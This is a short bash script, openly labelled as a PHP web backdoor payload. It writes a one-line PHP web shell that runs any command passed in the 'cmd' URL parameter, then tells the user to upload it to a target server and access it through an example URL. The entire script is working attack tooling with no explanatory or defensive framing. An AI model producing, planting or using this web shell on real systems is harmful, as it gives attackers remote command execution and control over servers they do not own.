#!/bin/bash
# Payload: PHP Web Backdoor
TARGET=$1
FILENAME="oberon_shell.php"

echo "<?php if(isset(\$_GET['cmd'])){ system(\$_GET['cmd']); } ?>" > $FILENAME
echo "[*] Backdoor generated: $FILENAME"
echo "[!] Upload this to $TARGET and access via:"
echo "    http://$TARGET/$FILENAME?cmd=id"
